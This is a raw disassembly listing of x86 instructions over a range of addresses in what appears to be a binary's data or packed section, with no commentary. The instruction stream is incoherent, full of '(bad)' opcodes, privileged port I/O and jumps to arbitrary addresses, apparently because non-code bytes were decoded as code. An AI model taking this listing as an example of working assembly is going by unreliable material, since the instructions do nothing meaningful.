  405a2e:	sbb    DWORD PTR [edi+0x5f],0x445b19a3
  405a35:	fwait
  405a36:	sti    
  405a37:	xlat   BYTE PTR ds:[ebx]
  405a38:	scas   al,BYTE PTR es:[edi]
  405a39:	mov    eax,DWORD PTR [edi-0x1d509126]
  405a3f:	jne    0x4059c6
  405a41:	in     eax,dx
  405a42:	push   edi
  405a43:	sub    al,0xc7
  405a45:	dec    ebx
  405a46:	mov    WORD PTR [edi-0xbed2e6c],fs
  405a4c:	pop    es
  405a4d:	cwde   
  405a4e:	into   
  405a4f:	mov    cl,0x2b
  405a51:	mov    esi,0x34706adb
  405a56:	sbb    BYTE PTR [ecx],dh
  405a58:	xor    DWORD PTR [ebx],esp
  405a5a:	push   edi
  405a5b:	push   ds
  405a5c:	mov    cl,0xac
  405a5e:	arpl   WORD PTR [ebx+edi*4],bp
  405a61:	cmp    DWORD PTR [ebx],esi
  405a63:	pop    ecx
  405a64:	loop   0x405a42
  405a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a67:	inc    esi
  405a68:	pop    ebx
  405a69:	retf   0xadcd
  405a6c:	xlat   BYTE PTR ds:[ebx]
  405a6d:	mov    bh,0xcb
  405a6f:	pop    es
  405a70:	pop    ss
  405a71:	ss fdivrp st(1),st
  405a74:	cld    
  405a75:	das    
  405a76:	xchg   ebp,eax
  405a77:	mov    edx,0x797f6df
  405a7c:	pop    es
  405a7d:	adc    DWORD PTR [eax+esi*8-0x2f],edi
  405a81:	sbb    eax,0x1c374f1f
  405a86:	push   edi
  405a87:	jge    0x405acc
  405a89:	popa   
  405a8a:	aad    0x77
  405a8c:	xchg   BYTE PTR [esi-0x29],cl
  405a8f:	jae    0x405a30
  405a91:	sbb    eax,0xf6f347e9
  405a96:	mov    esp,0x69ff4a57
  405a9b:	push   0xffffffba
  405a9d:	xor    BYTE PTR [ebx+0x7b18289a],dl
  405aa3:	outs   dx,BYTE PTR ds:[esi]
  405aa4:	(bad)  
  405aa5:	cmp    eax,0xcac4d874
  405aaa:	mov    ebx,0x4f7941f8
  405aaf:	xor    BYTE PTR [edx+0x3da3eb51],0x3d
  405ab6:	pop    eax
  405ab7:	out    dx,al
  405ab8:	push   0x48
  405aba:	aaa    
  405abb:	leave  
  405abc:	push   edx
  405abd:	dec    eax
  405abe:	jne    0x405a54
  405ac0:	inc    ebp
  405ac1:	jg     0x405a88
  405ac3:	repnz aas 
  405ac5:	cmp    BYTE PTR [eax-0x5d],al
  405ac8:	mov    al,ds:0x6c4453a
  405acd:	dec    ecx
  405ace:	aad    0xea
  405ad0:	test   DWORD PTR [esi+0x1ea6965e],edx
  405ad6:	inc    ecx
  405ad7:	std    
  405ad8:	aas    
  405ad9:	retf   0xc36
  405adc:	xchg   ebx,edi
  405ade:	rol    DWORD PTR [ebx],cl
  405ae0:	stc    
  405ae1:	stc    
  405ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae3:	(bad)  
  405ae4:	sub    esi,DWORD PTR [ecx+0x3f521970]
  405aea:	fistp  QWORD PTR ds:0x3fd26eed
  405af0:	push   ecx
  405af1:	aam    0x3c
  405af3:	shl    ecx,0xc
  405af6:	dec    edi
  405af7:	inc    edx
  405af8:	mov    ah,0x13
  405afa:	iret   
  405afb:	dec    esp
  405afc:	sbb    bh,bh
  405afe:	ret    0x6881
  405b01:	aas    
  405b02:	add    eax,DWORD PTR fs:[ebx+edx*8-0x60d70211]
  405b0a:	adc    eax,0x2308d1f6
  405b0f:	test   eax,0x55ae3d24
  405b14:	or     eax,0xfd36e839
  405b19:	or     ecx,DWORD PTR [ebp-0x3f]
  405b1c:	jae    0x405aa5
  405b1e:	fnstsw WORD PTR [esi+0x28]
  405b21:	xchg   edx,eax
  405b22:	sub    edi,DWORD PTR [edx-0x3c]
  405b25:	cs je  0x405ab6
  405b28:	(bad)  
  405b29:	in     al,dx
  405b2a:	and    BYTE PTR cs:[ebx],ah
  405b2d:	out    dx,eax
  405b2e:	(bad)  
  405b2f:	mov    ds:0xaf89db3b,eax
  405b34:	jp     0x405b9d
  405b36:	fs push es
  405b38:	shl    DWORD PTR [ecx+0x50a56a1e],cl
  405b3e:	push   ebx
  405b3f:	imul   eax,DWORD PTR ds:0x78e6d44f,0xffffff8d
  405b46:	jp     0x405b31
  405b48:	push   ecx
  405b49:	pop    ds
  405b4a:	xor    BYTE PTR [eax-0x13],dl
  405b4d:	lods   eax,DWORD PTR ds:[esi]
  405b4e:	out    dx,eax
  405b4f:	aas    
  405b50:	pushf  
  405b51:	gs jge 0x405ad8
  405b54:	lock call 0x34861d77
  405b5a:	mov    DWORD PTR [edx+0x41b5055b],ecx
  405b60:	or     al,BYTE PTR [ebx-0x385c301a]
  405b66:	cld    
  405b67:	ja     0x405b46
  405b69:	adc    DWORD PTR [esi-0x144c9ac],esi
  405b6f:	pop    edx
  405b70:	bnd data16 jg 0x405bc6
  405b74:	mov    ah,0x23
  405b76:	je     0x405bc7
  405b78:	mov    dl,0xb4
  405b7a:	adc    DWORD PTR [edi-0x2a],ebx
  405b7d:	xchg   esp,eax
  405b7e:	outs   dx,BYTE PTR ds:[esi]
  405b7f:	rol    DWORD PTR [ecx-0x7fb9ca5b],1
  405b85:	(bad)  
  405b86:	aaa    
  405b87:	add    ecx,DWORD PTR [esi-0x53]
  405b8a:	add    al,0x95
  405b8c:	(bad)  
  405b8d:	mov    ds:0x32beefdd,al
  405b92:	mov    al,0x44
  405b94:	push   0x2231ef48
  405b99:	mov    DWORD PTR [ebx+0x58],ebx
  405b9c:	addr16 clc 
  405b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9f:	and    BYTE PTR [ecx-0x6a],0x54
  405ba3:	test   BYTE PTR [esi-0x37],al
  405ba6:	mov    WORD PTR [edi],ss
  405ba8:	and    BYTE PTR [ebp+0x3b],ch
  405bab:	stos   BYTE PTR es:[edi],al
  405bac:	xor    eax,0xefcb72d7
  405bb1:	xor    ebp,DWORD PTR [ebx+0x60635053]
  405bb7:	jmp    0x1c8235e4
  405bbc:	adc    ecx,DWORD PTR [edi+edx*2+0x25c0a5d4]
  405bc3:	jae    0x405b9c
  405bc5:	stos   DWORD PTR es:[edi],eax
  405bc6:	cdq    
  405bc7:	mov    esp,0x78f771f3
  405bcc:	xchg   edi,eax
  405bcd:	pop    ss
  405bce:	and    esp,DWORD PTR [edx+0x11]
  405bd1:	push   ebx
  405bd2:	out    dx,eax
  405bd3:	scas   eax,DWORD PTR es:[edi]
  405bd4:	and    al,0x58
  405bd6:	xchg   esi,eax
  405bd7:	dec    ebp
  405bd8:	std    
  405bd9:	leave  
  405bda:	outs   dx,BYTE PTR ds:[esi]
  405bdb:	fcomp  QWORD PTR [ecx+0x3007defd]
  405be1:	rol    bl,cl
  405be3:	jecxz  0x405c12
  405be5:	std    
  405be6:	(bad)  
  405be7:	ja     0x405b73
  405be9:	test   BYTE PTR [edx+0x52],0x3c
  405bed:	jg     0x405b74
  405bef:	push   ebx
  405bf0:	iret   
  405bf1:	retf   
  405bf2:	mov    esi,0x9b780279
  405bf7:	inc    ecx
  405bf8:	clc    
  405bf9:	or     BYTE PTR [ecx-0x1e89180b],bl
  405bff:	push   edx
  405c00:	in     eax,0xa2
  405c02:	je     0x405c01
  405c04:	imul   edx,DWORD PTR [ebx-0x23],0x48
  405c08:	pushf  
  405c09:	and    BYTE PTR [eax],cl
  405c0b:	mov    edx,0x489b523a
  405c10:	ins    BYTE PTR es:[edi],dx
  405c11:	sbb    eax,0x39351fd5
  405c16:	xchg   ecx,eax
  405c17:	xor    BYTE PTR [ebx+0x1a6564bd],ch
  405c1d:	shl    BYTE PTR [eax],cl
  405c1f:	or     BYTE PTR [esi+0x79],al
  405c22:	(bad)  
  405c23:	lahf   
  405c24:	cmovbe esp,DWORD PTR [esp+edi*2]
  405c28:	sub    BYTE PTR [eax+0xc],ah
  405c2b:	lahf   
  405c2c:	fstp   QWORD PTR [ebx-0xcfdc831]
  405c32:	(bad)  [edi+0x6c]
  405c35:	in     eax,dx
  405c36:	mov    al,ds:0xc26d0f10
  405c3b:	xor    edx,ebx
  405c3d:	retf   
  405c3e:	inc    DWORD PTR [ecx-0x46]
  405c41:	popf   
  405c42:	rcl    DWORD PTR [edi],0xb8
  405c45:	lea    edx,[ecx-0x497cac55]
  405c4b:	mov    ss,ebx
  405c4d:	mov    ah,0x2a
  405c4f:	sbb    eax,0x1b0a94ad
  405c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c55:	pop    ds
  405c56:	arpl   bx,cx
  405c58:	sbb    eax,0x1c894f2b
  405c5d:	pusha  
  405c5e:	mov    ecx,DWORD PTR [edx+0x4ed0baf0]
  405c64:	xchg   ebp,eax
  405c65:	fsubr  DWORD PTR ds:0x97120f73
  405c6b:	sti    
  405c6c:	jp     0x405c18
  405c6e:	push   edi
  405c6f:	rol    ah,cl
  405c71:	jb     0x405c3e
  405c73:	push   esi
  405c74:	jp     0x405c06
  405c76:	inc    edx
  405c77:	push   esi
  405c78:	sbb    DWORD PTR [esi+eiz*1+0xcbe750a],eax
  405c7f:	sbb    eax,0x75090dd1
  405c84:	mov    eax,ds:0x748f765f
  405c89:	stos   BYTE PTR es:[edi],al
  405c8a:	jbe    0x405c73
  405c8c:	pushf  
  405c8d:	fiadd  WORD PTR [edx]
  405c8f:	fnstenv [eax*4+0x21b60b53]
  405c96:	loope  0x405cd7
  405c98:	mov    dh,BYTE PTR [ecx]
  405c9a:	stc    
  405c9b:	lock mov DWORD PTR [edi+0x12],esi
  405c9f:	or     al,dh
  405ca1:	out    0xa,eax
  405ca3:	imul   edx,DWORD PTR cs:[eax+0x5c],0x5b
  405ca8:	pushf  
  405ca9:	add    BYTE PTR [edi-0x4ccd4f49],bl
  405caf:	fild   WORD PTR [edx+0x5c]
  405cb2:	pop    ds
  405cb3:	add    ax,0xb20e
  405cb7:	and    eax,0xd19c150a
  405cbc:	ja     0x405d1c
  405cbe:	jb     0x405cfb
  405cc0:	xchg   ebp,eax
  405cc1:	aaa    
  405cc2:	ret    
  405cc3:	rol    BYTE PTR [eax-0x6c],cl
  405cc6:	pop    ss
  405cc7:	xor    bl,al
  405cc9:	mov    esi,0x9b7a894f
  405cce:	shl    DWORD PTR [ecx-0xfd2fcd6],cl
  405cd4:	inc    edi
  405cd5:	test   BYTE PTR [ebx],ch
  405cd7:	push   esi
  405cd8:	and    DWORD PTR [ebx],0xffffff88
  405cdb:	add    DWORD PTR [edi-0x19],0xffffffb1
  405cdf:	mov    bl,0xcb
  405ce1:	mov    esi,0x91275339
  405ce6:	retf   0xd936
  405ce9:	xchg   DWORD PTR [eax-0x2573bb4c],esi
  405cef:	je     0x405cce
  405cf1:	jae    0x405d4b
  405cf3:	push   edx
  405cf4:	cmp    DWORD PTR [ebx+0x40],esi
  405cf7:	aas    
  405cf8:	ror    BYTE PTR [esi+edi*2-0x3b],cl
  405cfc:	pop    es
  405cfd:	es fcmovbe st,st(3)
  405d00:	daa    
  405d01:	cmp    BYTE PTR [ebp-0x5571a91],dh
  405d07:	jecxz  0x405c8d
  405d09:	mov    edi,0xa959ba3c
  405d0e:	in     al,dx
  405d0f:	js     0x405d6c
  405d11:	fwait
  405d12:	push   esp
  405d13:	popa   
  405d14:	xor    dl,BYTE PTR [esi-0x5c]
  405d17:	lock jecxz 0x405ce8
  405d1a:	cmc    
  405d1b:	test   BYTE PTR [edi+0x73],cl
  405d1e:	mov    DWORD PTR [edx-0x56],ebp
  405d21:	jae    0x405d2e
  405d23:	cli    
  405d24:	inc    esp
  405d25:	xor    al,0x88
  405d27:	mov    ds:0x7bee8aa6,al
  405d2c:	push   ebp
  405d2d:	fadd   DWORD PTR [esi+0x4b79ac35]
  405d33:	mov    edi,0xf12779d2
  405d38:	(bad)  
  405d39:	sub    al,0x6e
  405d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3c:	outs   dx,BYTE PTR ds:[esi]
  405d3d:	push   eax
  405d3e:	scas   eax,DWORD PTR es:[edi]
  405d3f:	ins    DWORD PTR es:[edi],dx
  405d40:	cmp    DWORD PTR [ebp+0x50ad97e7],edx
  405d46:	sub    DWORD PTR [esi],edi
  405d48:	adc    DWORD PTR [edi-0x56],0x5b
  405d4c:	push   edi
  405d4d:	and    edi,DWORD PTR [ecx]
  405d4f:	sub    DWORD PTR [edi+0x47],edi
  405d52:	test   BYTE PTR [eax-0x3e],dh
  405d55:	into   
  405d56:	popa   
  405d57:	sbb    al,0xe8
  405d59:	jp     0x405d6b
  405d5b:	call   0x4c312769
  405d60:	pop    ecx
  405d61:	sbb    edi,DWORD PTR gs:[edi+0x49]
  405d65:	stos   BYTE PTR es:[edi],al
  405d66:	pop    edx
  405d67:	sub    cl,BYTE PTR [ecx+ebp*8+0x7f329fdd]
  405d6e:	into   
  405d6f:	mov    esp,0xf0c87e5b
  405d74:	pop    ebp
  405d75:	xchg   esp,eax
  405d76:	add    eax,0x9e14edfb
  405d7b:	out    dx,eax
  405d7c:	push   cs
  405d7d:	pop    ebx
  405d7e:	ficomp WORD PTR [eax+edx*2]
  405d81:	add    BYTE PTR [ecx+0x824bf92],dh
  405d87:	xchg   ebx,eax
  405d88:	add    ah,ch
  405d8a:	cmp    bl,dl
  405d8c:	cld    
  405d8d:	pop    edi
  405d8e:	xchg   ecx,eax
  405d8f:	data16 mov dh,0xda
  405d92:	jle    0x405db6
  405d94:	inc    edi
  405d95:	jl     0x405d7c
  405d97:	(bad)  
  405d98:	cwde   
  405d99:	outs   dx,DWORD PTR cs:[esi]
  405d9b:	and    eax,0x8589032
  405da0:	add    DWORD PTR [eax+0x17820f14],ebx
  405da6:	jno    0x405d50
  405da8:	add    edx,DWORD PTR [eax+0x566f5933]
  405dae:	mov    ebp,0x96f260e9
  405db3:	push   0x4442fca
  405db8:	push   ebp
  405db9:	or     ch,BYTE PTR [edi-0x1365e5d]
  405dbf:	sub    dh,BYTE PTR [edx]
  405dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc2:	pop    ss
  405dc3:	and    edi,ecx
  405dc5:	lock stos BYTE PTR es:[edi],al
  405dc7:	fistp  QWORD PTR [eax-0x34]
  405dca:	dec    esi
  405dcb:	push   ss
  405dcc:	mov    eax,0xb10fe20c
  405dd1:	out    0x4e,al
  405dd3:	push   eax
  405dd4:	pop    ebp
  405dd5:	fwait
  405dd6:	sub    BYTE PTR [ecx-0x69],bl
  405dd9:	pop    ss
  405dda:	push   0x48
  405ddc:	in     eax,0x83
  405dde:	sbb    BYTE PTR [ecx+ebp*1],cl
  405de1:	rep outs dx,DWORD PTR ds:[esi]
  405de3:	lods   eax,DWORD PTR ds:[esi]
  405de4:	and    al,0xa2
  405de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de7:	mov    BYTE PTR [eax-0x7bd7a4d3],dl
  405ded:	(bad)  
  405dee:	and    eax,0x85d26d6d
  405df3:	ficomp WORD PTR [ebp+0x2]
  405df6:	and    eax,ebp
  405df8:	stos   BYTE PTR es:[edi],al
  405df9:	in     eax,dx
  405dfa:	ret    0x2133
  405dfd:	cdq    
  405dfe:	mov    BYTE PTR [ecx],bh
  405e00:	xchg   BYTE PTR [esi-0x4902ec55],cl
  405e06:	stos   DWORD PTR es:[edi],eax
  405e07:	xor    DWORD PTR [ecx+0x2f],eax
  405e0a:	pop    ss
  405e0b:	jb     0x405d9d
  405e0d:	loopne 0x405dba
  405e0f:	bound  ebx,QWORD PTR [eax-0x6e]
  405e12:	cdq    
  405e13:	repnz inc ecx
  405e15:	scas   al,BYTE PTR es:[edi]
  405e16:	mov    eax,0x93e5f0d6
  405e1b:	ret    0x101c
  405e1e:	out    dx,eax
  405e1f:	addr16 dec esp
  405e21:	into   
  405e22:	popf   
  405e23:	add    ebp,eax
  405e25:	aam    0x51
  405e27:	dec    esi
  405e28:	call   0xaade816d
  405e2d:	loopne 0x405e67
  405e2f:	(bad)  
  405e30:	xchg   esp,eax
  405e31:	mov    DWORD PTR [ebx+eiz*8+0x75],ebp
  405e35:	les    ecx,FWORD PTR [esi]
  405e37:	fimul  DWORD PTR [ebx]
  405e39:	jae    0x405e0c
  405e3b:	and    al,0xb6
  405e3d:	aad    0x95
  405e3f:	adc    esi,edi
  405e41:	cwde   
  405e42:	jne    0x405e03
  405e44:	xchg   esp,eax
  405e45:	loope  0x405ddd
  405e47:	cmc    
  405e48:	loopne 0x405eae
  405e4a:	inc    esi
  405e4b:	call   0x1dd4240
  405e50:	(bad)  
  405e52:	test   BYTE PTR [ecx+ebx*1+0x65cd5663],0xe8
  405e5a:	sti    
  405e5b:	xchg   BYTE PTR [ebp+0x30115af5],bh
  405e61:	shl    DWORD PTR [esi+esi*4-0x2b],1
  405e65:	xlat   BYTE PTR ds:[ebx]
  405e66:	push   es
  405e67:	push   0x69857aec
  405e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e6d:	add    DWORD PTR ds:0xd2855c9f,ecx
  405e73:	or     DWORD PTR [ebx],ebx
  405e75:	add    ebx,DWORD PTR [esi-0x5]
  405e78:	cmc    
  405e79:	mov    ch,0xc7
  405e7b:	cmp    esi,DWORD PTR ds:0xfa27d3e6
  405e81:	xor    ch,BYTE PTR [esp+edx*2]
  405e84:	xchg   BYTE PTR [ebp-0x47],dh
  405e87:	sub    BYTE PTR [esi],dl
  405e89:	pusha  
  405e8a:	dec    BYTE PTR [edi]
  405e8c:	fcmovbe st,st(6)
  405e8e:	mov    dh,0x90
  405e90:	mov    ebx,0xc7400d1e
  405e95:	jbe    0x405e81
  405e97:	aaa    
  405e98:	(bad)  
  405e99:	add    eax,0xccdf7622
  405e9e:	cmc    
  405e9f:	jle    0x405e72
  405ea1:	(bad)  
  405ea2:	mov    eax,0xa6e618
  405ea7:	dec    edi
  405ea8:	mov    al,0x5e
  405eaa:	or     al,0x10
  405eac:	les    eax,FWORD PTR [esi]
  405eae:	jmp    0xf6d7:0x8bf13f9c
  405eb5:	bnd jae 0x405e9e
  405eb8:	loopne 0x405e3c
  405eba:	lds    ebp,FWORD PTR [ebx]
  405ebc:	sti    
  405ebd:	dec    esp
  405ebe:	or     DWORD PTR [esi-0x4d3bafdb],ecx
  405ec4:	lahf   
  405ec5:	xchg   ebx,eax
  405ec6:	push   cs
  405ec7:	push   ds
  405ec8:	repz jno 0x405e91
  405ecb:	xchg   DWORD PTR [ebp+0x56],ebp
  405ece:	sub    eax,0x3ab28aff
  405ed3:	mov    BYTE PTR [edi-0x1a861277],bl
  405ed9:	adc    bh,ch
  405edb:	sbb    eax,0xd7cc1b38
  405ee0:	sar    DWORD PTR [esi+0x1f607209],0x4f
  405ee7:	sbb    bh,BYTE PTR [ecx+0x6b375bfe]
  405eed:	outs   dx,DWORD PTR ds:[esi]
  405eee:	jne    0x405e82
  405ef0:	lds    esi,FWORD PTR [ebp+0x54]
  405ef3:	xor    eax,0x70a140d0
  405ef8:	cli    
  405ef9:	xor    al,0x40
  405efb:	out    dx,eax
  405efc:	push   ebp
  405efd:	or     DWORD PTR ds:0xb183dc4c,esi
  405f03:	pop    edx
  405f04:	push   esi
  405f05:	or     dh,al
  405f07:	xchg   esi,eax
  405f08:	ret    
  405f09:	push   eax
  405f0a:	mov    ds:0xb35692d0,al
  405f0f:	sub    dh,BYTE PTR [eax]
  405f11:	xchg   esp,eax
  405f12:	mov    ecx,0xecd58287
  405f17:	outs   dx,DWORD PTR ds:[esi]
  405f18:	mov    ah,0x3
  405f1a:	fwait
  405f1b:	sti    
  405f1c:	test   BYTE PTR [ebx+0x37ec5cfd],bl
  405f22:	mov    bl,0x85
  405f24:	scas   al,BYTE PTR es:[edi]
  405f25:	dec    edi
  405f26:	shl    BYTE PTR [edi],0x8e
  405f29:	ins    BYTE PTR es:[edi],dx
  405f2a:	mov    ecx,0xa660d5de
  405f2f:	outs   dx,DWORD PTR ds:[esi]
  405f30:	sub    DWORD PTR [edx-0x2faca8f7],eax
  405f36:	and    ah,0x8d
  405f39:	es scas eax,DWORD PTR es:[edi]
  405f3b:	aam    0xb8
  405f3d:	sbb    BYTE PTR [ebx+0x33d7ca7c],0x8d
  405f44:	mov    ah,0x1b
  405f46:	std    
  405f47:	inc    edi
  405f48:	mov    DWORD PTR [ecx],edi
  405f4a:	div    bh
  405f4c:	(bad)  
  405f4d:	outs   dx,BYTE PTR ds:[esi]
  405f4e:	sbb    al,0xa4
  405f50:	jp     0x405ee8
  405f52:	mov    ah,0x1e
  405f54:	cli    
  405f55:	push   ss
  405f56:	bound  edi,QWORD PTR ds:0xfca95a40
  405f5c:	mov    BYTE PTR [ebx],bh
  405f5e:	shr    DWORD PTR [ebx-0x52],1
  405f61:	mov    dl,0x7f
  405f63:	(bad)  
  405f64:	fbld   TBYTE PTR [edx-0x415a7309]
  405f6a:	test   al,0x8b
  405f6c:	test   edx,ebx
  405f6e:	pop    ds
  405f6f:	nop
  405f70:	sbb    eax,0x1750673c
  405f75:	and    eax,eax
  405f77:	clc    
  405f78:	push   ds
  405f79:	outs   dx,BYTE PTR ds:[esi]
  405f7a:	jp     0x405f3f
  405f7c:	ins    BYTE PTR es:[edi],dx
  405f7d:	cmp    dl,BYTE PTR [ebx]
  405f7f:	retf   
  405f80:	test   eax,0x37555bdd
  405f85:	out    0x6,al
  405f87:	cmp    bh,ch
  405f89:	stos   BYTE PTR es:[edi],al
  405f8a:	lahf   
  405f8b:	jo     0x405f4e
  405f8d:	jl     0x405fd2
  405f8f:	and    DWORD PTR [esi+0x3fe5503e],esi
  405f95:	call   0x8941:0x3a84496c
  405f9c:	retf   
  405f9d:	jbe    0x405f76
  405f9f:	jmp    0x4fcc:0xb6f67692
  405fa6:	sub    BYTE PTR [edi-0x45354aa5],dl
  405fac:	push   ebx
  405fad:	aas    
  405fae:	xchg   edi,eax
  405faf:	push   cs
  405fb0:	pusha  
  405fb1:	and    DWORD PTR [edx-0x4c27a7ea],edi
  405fb7:	inc    esi
  405fb8:	xor    eax,0x39a2c216
  405fbd:	mov    eax,ds:0xa97fd7b2
  405fc2:	add    al,0x6d
  405fc4:	jg     0x405ff4
  405fc6:	ret    0x20d5
  405fc9:	pop    edx
  405fca:	pop    esp
  405fcb:	fadd   st,st(5)
  405fcd:	add    BYTE PTR [eax],bh
  405fcf:	pop    edi
  405fd0:	mov    dl,BYTE PTR [ebx]
  405fd2:	mov    dh,0xc
  405fd4:	(bad)  
  405fd5:	call   0x5d21bf41
  405fda:	push   esp
  405fdb:	sub    edx,DWORD PTR [esi]
  405fdd:	mov    ebp,eax
  405fdf:	ret    0x178a
  405fe2:	inc    ebp
  405fe3:	dec    ebx
  405fe4:	icebp  
  405fe5:	or     BYTE PTR [esi+0x19],bl
  405fe8:	retf   0xe97f
  405feb:	mov    edi,0x7bea8b7b
  405ff0:	mov    esi,0x52e11afb
  405ff5:	push   edi
  405ff6:	dec    ebp
  405ff7:	mov    WORD PTR [ebx+0x75],ss
  405ffa:	xor    DWORD PTR [edx-0x6f87f428],ebp
  406000:	xor    ch,BYTE PTR [edx]
  406002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	dec    esp
  406005:	mov    al,0xf9
  406007:	jge    0x40602d
  406009:	(bad)  
  40600a:	repnz add BYTE PTR [esi-0x5],cl
  40600e:	jmp    0x40608a
  406010:	mov    al,0xbd
  406012:	xchg   edi,eax
  406013:	xchg   BYTE PTR [ebx+0x4fc5f114],ah
  406019:	xchg   edx,eax
  40601a:	mov    edx,0xd9712fa
  40601f:	jl     0x405fb7
  406021:	inc    ebx
  406022:	mov    esi,0x96814eb1
  406027:	adc    eax,0x52a2c20a
  40602c:	or     DWORD PTR [esi-0x54],0xffffffc0
  406030:	cs dec esi
  406032:	div    DWORD PTR [ecx+0x7]
  406035:	(bad)  
  406036:	int3   
  406037:	(bad)  
  406038:	(bad)  
  406039:	sahf   
  40603a:	or     ebx,0x9
  40603d:	int    0x55
  40603f:	mov    esi,0xcc658a05
  406044:	sbb    DWORD PTR [edi+edi*8+0x3c05af11],eax
  40604b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40604c:	imul   edi,ecx,0x46f9bd8
  406052:	(bad)  
  406053:	xor    al,0xbb
  406055:	mov    esp,0x75428d98
  40605a:	es ins DWORD PTR es:[edi],dx
  40605c:	xor    BYTE PTR [ebp-0x56],bh
  40605f:	lods   al,BYTE PTR ds:[esi]
  406060:	push   ds
  406061:	jmp    0x4c963fcb
  406066:	das    
  406067:	cmp    al,0x11
  406069:	inc    eax
  40606a:	or     esi,esp
  40606c:	shl    DWORD PTR [edx-0x38],1
  40606f:	push   edx
  406070:	jbe    0x40606a
  406072:	scas   al,BYTE PTR es:[edi]
  406073:	or     BYTE PTR [edi],ah
  406075:	fdiv   DWORD PTR [esi]
  406077:	das    
  406078:	daa    
  406079:	cmp    ah,dl
  40607b:	inc    eax
  40607c:	repz or dl,cl
  40607f:	adc    edi,DWORD PTR [ecx-0x18]
  406082:	out    0xbe,eax
  406084:	sbb    eax,0xacf7c464
  406089:	hlt    
  40608a:	mov    ds:0xe2abf8a3,al
  40608f:	ins    BYTE PTR es:[edi],dx
  406090:	jo     0x40603e
  406092:	push   ss
  406093:	inc    ebx
  406094:	sbb    ecx,DWORD PTR [edx+0x7a494539]
  40609a:	push   edi
  40609b:	xchg   esp,eax
  40609c:	in     al,0xa6
  40609e:	cdq    
  40609f:	retf   0x1610
  4060a2:	imul   ebp,DWORD PTR [edi],0xffffffcc
  4060a5:	adc    al,0x68
  4060a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060a8:	in     al,dx
  4060a9:	pop    es
  4060aa:	add    dh,cl
  4060ac:	stos   BYTE PTR es:[edi],al
  4060ad:	shl    BYTE PTR [ebp+0x427e6d61],cl
  4060b3:	or     cl,BYTE PTR [eax-0x76]
  4060b6:	or     al,0x60
  4060b8:	cmp    DWORD PTR [ecx+0x447a6a7],ebx
  4060be:	daa    
  4060bf:	shl    DWORD PTR [esi-0x4417a859],1
  4060c5:	push   esp
  4060c6:	int3   
  4060c7:	sti    
  4060c8:	fldcw  WORD PTR [ebp+ebx*8+0x78]
  4060cc:	xchg   edx,eax
  4060cd:	mov    bl,0x3c
  4060cf:	dec    eax
  4060d0:	bnd jl 0x406081
  4060d3:	mov    eax,DWORD PTR [edx]
  4060d5:	int3   
  4060d6:	and    ch,BYTE PTR [eax+0x5bb02a9f]
  4060dc:	lea    ebp,[eax+0xb]
  4060df:	sbb    BYTE PTR [ecx],dh
  4060e1:	rcl    BYTE PTR [esi],cl
  4060e3:	jmp    0x24f11ad4
  4060e8:	inc    eax
  4060e9:	pop    edx
  4060ea:	es popf 
  4060ec:	pop    eax
  4060ed:	arpl   WORD PTR [ecx],cx
  4060ef:	mov    edi,esi
  4060f1:	out    0xe3,al
  4060f3:	aaa    
  4060f4:	xor    DWORD PTR [eax-0x37460a6f],esp
  4060fa:	sbb    BYTE PTR ds:0x263870f9,al
  406100:	neg    BYTE PTR [ecx+0x4ec6d8ce]
  406106:	je     0x4060d9
  406108:	cmp    edi,ebp
  40610a:	xor    ch,BYTE PTR [edi]
  40610c:	repz xor cl,BYTE PTR [eax-0x6d1c567b]
  406113:	retf   
  406114:	stos   DWORD PTR es:[edi],eax
  406115:	enter  0x58d7,0xf3
  406119:	popa   
  40611a:	add    DWORD PTR [esp+eiz*2],edx
  40611d:	sti    
  40611e:	mov    esp,0x39845a69
  406123:	push   es
  406124:	xor    BYTE PTR [edi],bl
  406126:	cmp    al,0x43
  406129:	test   BYTE PTR [edi+0x265c8500],0x97
  406130:	mov    esi,0x168c2f9f
  406135:	jp     0x406134
  406137:	cmc    
  406138:	dec    ebp
  406139:	jo     0x4061ad
  40613b:	pop    esi
  40613c:	int    0x87
  40613e:	adc    eax,0xc46720a
  406143:	ds xor eax,0x29fdd23e
  406149:	sub    ah,BYTE PTR [esi]
  40614b:	jle    0x4060dc
  40614d:	jb     0x4060e4
  40614f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406150:	dec    edi
  406151:	jl     0x4060f5
  406153:	jecxz  0x406134
  406155:	int3   
  406156:	or     DWORD PTR [ebp+0x60],esp
  406159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615a:	adc    eax,0x1a6446bd
  40615f:	blcmsk ecx,DWORD PTR [ecx-0x1c0d0ed]
  406168:	inc    edx
  406169:	test   DWORD PTR ds:0x5aa4e710,ebp
  40616f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406170:	mov    BYTE PTR [esi+0x53ebf874],bl
  406176:	xchg   esi,eax
  406177:	cmc    
  406178:	cwde   
  406179:	addr16 ret 
  40617b:	sti    
  40617c:	sub    al,0x49
  40617e:	and    BYTE PTR [eax-0x33],dl
  406181:	pushf  
  406182:	das    
  406183:	in     eax,dx
  406184:	sub    DWORD PTR [eax+0x32],ebp
  406187:	fisubr WORD PTR [ebx+0x2140a89b]
  40618d:	dec    eax
  40618e:	xor    BYTE PTR [ebp+0x15097387],ah
  406194:	ss add eax,0x584280f5
  40619a:	int    0xa9
  40619c:	mov    bh,0xc7
  40619e:	hlt    
  40619f:	mov    esp,0x83dd8065
  4061a4:	sub    al,BYTE PTR [ebx-0x2031bb59]
  4061aa:	cwde   
  4061ab:	mov    al,ds:0x2a9d4e6e
  4061b0:	dec    esi
  4061b1:	jl     0x40622f
  4061b3:	pop    ecx
  4061b4:	imul   esi,DWORD PTR [eax-0x60afb4ce],0xffffffbe
  4061bb:	js     0x40614c
  4061bd:	icebp  
  4061be:	pop    esi
